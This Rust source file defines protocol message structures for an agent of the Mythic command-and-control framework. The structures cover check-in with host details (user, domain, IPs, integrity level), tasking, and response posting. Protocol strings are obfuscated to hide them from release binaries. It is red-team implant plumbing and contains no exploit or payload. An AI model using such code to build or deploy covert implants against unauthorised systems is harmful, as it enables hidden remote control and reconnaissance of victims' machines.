//! Mythic 4.0 agent message types for plaintext communication.
//!
//! All owned strings and vectors come from `alloc`. Fixed protocol strings
//! are constructed with `obfstring!` so the literal does not appear in
//! release binaries.

use alloc::string::String;
use alloc::vec::Vec;

#[cfg(feature = "json")]
use serde::{Deserialize, Serialize};

/// Delegate entry for P2P forwarding (optional on any message).
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct Delegate {
    pub message: String,
    pub c2_profile: String,
    pub uuid: String,
    pub new_uuid: Option<String>,
}

/// Check-in request (agent → Mythic).
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct CheckinRequest {
    pub action: String,
    pub uuid: String,
    pub ips: Vec<String>,
    pub os: Option<String>,
    pub user: Option<String>,
    pub host: Option<String>,
    pub pid: Option<u32>,
    pub architecture: Option<String>,
    pub domain: Option<String>,
    pub integrity_level: Option<u32>,
    pub external_ip: Option<String>,
    pub encryption_key: Option<String>,
    pub decryption_key: Option<String>,
    pub process_name: Option<String>,
    pub delegates: Vec<Delegate>,
}

impl CheckinRequest {
    pub fn new(payload_uuid: &str) -> Self {
        Self {
            action: obfstring!("checkin"),
            uuid: String::from(payload_uuid),
            ips: Vec::new(),
            os: None,
            user: None,
            host: None,
            pid: None,
            architecture: None,
            domain: None,
            integrity_level: None,
            external_ip: None,
            encryption_key: None,
            decryption_key: None,
            process_name: None,
            delegates: Vec::new(),
        }
    }

    pub fn with_ips(mut self, ips: Vec<String>) -> Self {
        self.ips = ips;
        self
    }
    pub fn with_os(mut self, os: impl Into<String>) -> Self {
        self.os = Some(os.into());
        self
    }
    pub fn with_user(mut self, user: impl Into<String>) -> Self {
        self.user = Some(user.into());
        self
    }
    pub fn with_host(mut self, host: impl Into<String>) -> Self {
        self.host = Some(host.into());
        self
    }
    pub fn with_pid(mut self, pid: u32) -> Self {
        self.pid = Some(pid);
        self
    }
    pub fn with_architecture(mut self, arch: impl Into<String>) -> Self {
        self.architecture = Some(arch.into());
        self
    }
    pub fn with_domain(mut self, domain: impl Into<String>) -> Self {
        self.domain = Some(domain.into());
        self
    }
    pub fn with_integrity_level(mut self, level: u32) -> Self {
        self.integrity_level = Some(level);
        self
    }
    pub fn with_external_ip(mut self, ip: impl Into<String>) -> Self {
        self.external_ip = Some(ip.into());
        self
    }
    pub fn with_process_name(mut self, name: impl Into<String>) -> Self {
        self.process_name = Some(name.into());
        self
    }
}

/// Check-in response (Mythic → agent).
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct CheckinResponse {
    pub action: String,
    pub id: String,
    pub status: String,
}

impl CheckinResponse {
    pub fn success(callback_uuid: impl Into<String>) -> Self {
        Self {
            action: obfstring!("checkin"),
            id: callback_uuid.into(),
            status: obfstring!("success"),
        }
    }

    pub fn is_success(&self) -> bool {
        self.status == obfstring!("success")
    }
}

/// Task delivered by Mythic.
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct Task {
    pub command: String,
    pub parameters: String,
    pub timestamp: f64,
    pub id: String,
}

/// Get-tasking request (agent → Mythic).
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct GetTaskingRequest {
    pub action: String,
    pub tasking_size: i32,
    pub get_delegate_tasks: Option<bool>,
    pub delegates: Vec<Delegate>,
    pub responses: Vec<TaskResponse>,
}

impl GetTaskingRequest {
    pub fn new(tasking_size: i32) -> Self {
        Self {
            action: obfstring!("get_tasking"),
            tasking_size,
            get_delegate_tasks: None,
            delegates: Vec::new(),
            responses: Vec::new(),
        }
    }

    pub fn all() -> Self {
        Self::new(-1)
    }
}

/// Get-tasking response (Mythic → agent).
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct GetTaskingResponse {
    pub action: String,
    pub tasks: Vec<Task>,
    pub delegates: Vec<Delegate>,
    pub responses: Vec<TaskResponseAck>,
}

/// Individual task response sent by the agent.
#[derive(Debug, Clone, PartialEq, Default)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct TaskResponse {
    pub task_id: String,
    pub user_output: Option<String>,
    pub completed: Option<bool>,
    pub status: Option<String>,
    pub error: Option<String>,
}

impl TaskResponse {
    pub fn new(task_id: impl Into<String>) -> Self {
        Self {
            task_id: task_id.into(),
            ..Default::default()
        }
    }

    pub fn with_output(mut self, output: impl Into<String>) -> Self {
        self.user_output = Some(output.into());
        self
    }

    pub fn completed(mut self) -> Self {
        self.completed = Some(true);
        self
    }

    pub fn with_status(mut self, status: impl Into<String>) -> Self {
        self.status = Some(status.into());
        self
    }
}

/// Acknowledgement for a posted response.
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct TaskResponseAck {
    pub task_id: String,
    pub status: String,
    pub error: Option<String>,
}

/// Post-response request (agent → Mythic).
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct PostResponseRequest {
    pub action: String,
    pub responses: Vec<TaskResponse>,
    pub delegates: Vec<Delegate>,
}

impl PostResponseRequest {
    pub fn new(responses: Vec<TaskResponse>) -> Self {
        Self {
            action: obfstring!("post_response"),
            responses,
            delegates: Vec::new(),
        }
    }
}

/// Post-response response (Mythic → agent).
#[derive(Debug, Clone, PartialEq)]
#[cfg_attr(feature = "json", derive(Serialize, Deserialize))]
pub struct PostResponseResponse {
    pub action: String,
    pub responses: Vec<TaskResponseAck>,
    pub delegates: Vec<Delegate>,
}
